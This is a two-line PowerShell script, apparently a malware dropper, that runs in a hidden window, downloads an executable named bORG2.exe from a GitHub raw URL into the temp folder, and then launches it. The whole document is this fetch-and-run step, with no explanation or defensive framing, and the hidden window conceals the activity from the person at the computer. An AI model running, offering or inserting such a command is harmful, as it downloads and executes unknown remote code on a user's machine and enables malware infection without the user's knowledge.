powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:TMP\bORG2.exe
start-process "$env:TMP\bORG2.exe"

